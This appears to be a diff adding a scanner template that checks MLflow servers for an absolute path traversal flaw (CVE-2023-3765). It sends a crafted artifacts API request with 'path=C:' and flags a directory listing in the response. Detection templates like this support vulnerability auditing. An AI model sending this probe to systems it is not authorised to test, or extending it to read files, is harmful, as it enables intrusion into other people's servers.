@@ -1,0 +1,27 @@
+id: mlflow-absolute-path-traversal
+info:
+  name: Mlflow Absolute Path Traversal Vulnerability (CVE-2023-3765)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: CVE-2023-3765,path-traversal
+http:
+  - method: GET
+    path:
+      - "/ajax-api/2.0/mlflow-artifacts/artifacts?path=C:"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "files"
+          - "path"
+          - "is_dir"
+        condition: and
+        part: body
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
